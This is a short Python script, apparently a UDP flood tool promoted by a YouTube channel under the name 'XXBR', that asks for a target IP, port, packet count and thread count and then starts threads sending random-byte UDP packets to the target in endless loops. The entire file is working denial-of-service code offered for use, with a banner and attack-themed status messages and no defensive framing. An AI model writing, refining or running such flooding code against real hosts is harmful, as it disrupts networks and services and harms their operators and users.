#SUBS YT GW XXBR
import random
import threading
import socket
import os,sys

os.system("clear")
print("""\033[95m
█████████████████████████
█▄─▄▄─█░▄▄░▄█░▄▄░▄█▄─█─▄█
██─▄█▀██▀▄█▀██▀▄█▀██▄─▄██
▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀""")
print("—————————————————————————————————————————————————————")
print("TOOLS BY XXBR")
print("SUBS YT GW XXBR")
print("https://youtube.com/channel/UCf5b0wfhpcB6aPw7qoNnqQw")
print("—————————————————————————————————————————————————————")

ip = str(input("IP HOST :"))
port = int(input("PORT HOST :"))
choice = str(input("GASS ATTACK Y/N :"))
times = int(input("PACKETS :"))
threads = int(input("THREADS :"))

def xxbr():
    data = random._urandom(800)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
                print("\033[91m[☂]ATTACK ΣΣZZY XXBR")
        except:
            print("\033[94m[☂]TEMBUSKAN!!")

def xxbr2():
    data = random._urandom(810)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
                print("[☂]ΣΣZZY KATA XXBR")
        except:
            s.close()
            print("\033[94m[☂]TEMBUSKAN!!")

for y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = xxbr)
        th.start()
        th = threading.Thread(target = xxbr2)
        th.start()
